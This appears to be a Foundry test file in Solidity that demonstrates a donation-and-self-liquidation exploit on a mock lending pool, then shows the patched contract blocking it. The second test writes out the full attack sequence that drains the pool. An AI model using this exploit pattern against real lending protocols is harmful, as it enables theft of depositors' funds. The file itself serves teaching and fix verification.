// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/MockToken.sol";
import "../src/EulerLite.sol";
import "../src/EulerLiteFixed.sol";

contract EulerTest is Test {
    MockToken token;
    address LP = address(0xA11CE);
    address bob = address(0xB0B);
    address attacker = address(0xBAD);
    address attacker2 = address(0xBAD2);   // attacker's 2nd account (the "liquidator")

    function setUp() public { token = new MockToken(); }

    // ACT 1 — HONEST: a genuine market drop makes Bob underwater; a fair liquidation works.
    function test_1_honest_liquidation() public {
        EulerLite pool = new EulerLite(token);
        _seed(address(pool), LP, 10_000e18);
        // Bob: deposit 1000, borrow 800 (healthy: 1000*90% = 900 >= 800)
        _fund(bob, 1_000e18); vm.startPrank(bob);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(1_000e18); pool.borrow(800e18); vm.stopPrank();
        assertTrue(pool.healthy(bob));
        // the market drops 20% -> Bob is genuinely underwater
        pool.setPrice(8_000);
        assertFalse(pool.healthy(bob));
        // liquidator repays 600, seizes 720 of BOB'S OWN collateral (20% bonus) — fair
        _fund(address(this), 600e18); token.approve(address(pool), type(uint256).max);
        pool.liquidate(bob, 600e18);
        emit log_named_uint("ACT1 bob collateral left", pool.collateral(bob)/1e18);
        assertTrue(pool.healthy(bob), "bob back to healthy after fair liquidation");
    }

    // ACT 2 — ATTACK: no market move; attacker donates its own collateral (no health check),
    // self-liquidates, and walks away with MORE than it deposited — drained from the pool.
    function test_2_attack_drains_pool() public {
        EulerLite pool = new EulerLite(token);
        _seed(address(pool), LP, 10_000e18);
        uint256 poolBefore = token.balanceOf(address(pool));
        _fund(attacker, 1_000e18);
        uint256 start = token.balanceOf(attacker) + token.balanceOf(attacker2);

        vm.startPrank(attacker);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(1_000e18);
        pool.borrow(900e18);                 // healthy: 1000*90% = 900 >= 900
        pool.donateToReserves(1_000e18);     // ← BUG: now collateral 0, debt 900, but NO revert
        assertFalse(pool.healthy(attacker));
        token.transfer(attacker2, 900e18);   // move the borrowed funds to the 2nd account
        vm.stopPrank();

        vm.startPrank(attacker2);            // the attacker "liquidates" itself
        token.approve(address(pool), type(uint256).max);
        pool.liquidate(attacker, 800e18);    // seize 960 collateral (paid from donated reserves)
        pool.withdraw(960e18);               // pull real asset out of the pool
        vm.stopPrank();

        uint256 end = token.balanceOf(attacker) + token.balanceOf(attacker2);
        uint256 poolAfter = token.balanceOf(address(pool));
        emit log_named_uint("ATTACK start (mUSD)", start/1e18);
        emit log_named_uint("ATTACK end   (mUSD)", end/1e18);
        emit log_named_int ("ATTACK profit(mUSD)", int256(end)/1e18 - int256(start)/1e18);
        emit log_named_int ("POOL drained (mUSD)", int256(poolAfter)/1e18 - int256(poolBefore)/1e18);
        assertGt(end, start, "attacker profited");
        assertLt(poolAfter, poolBefore, "pool was drained");
    }

    // ACT 3 — FIX: the exact same attack on the fixed pool reverts at donateToReserves.
    function test_3_fix_blocks_attack() public {
        EulerLiteFixed pool = new EulerLiteFixed(token);
        _seed(address(pool), LP, 10_000e18);
        _fund(attacker, 1_000e18);
        vm.startPrank(attacker);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(1_000e18);
        pool.borrow(900e18);
        vm.expectRevert(bytes("unhealthy"));   // ← the health check now blocks the self-sabotage
        pool.donateToReserves(1_000e18);
        vm.stopPrank();
        assertTrue(pool.healthy(attacker), "attacker still healthy; attack blocked");
    }

    function _seed(address pool, address lp, uint256 amt) internal {
        _fund(lp, amt); vm.startPrank(lp);
        token.approve(pool, type(uint256).max); EulerLite(pool).deposit(amt); vm.stopPrank();
    }
    function _fund(address who, uint256 amt) internal { token.mint(who, amt); }
}
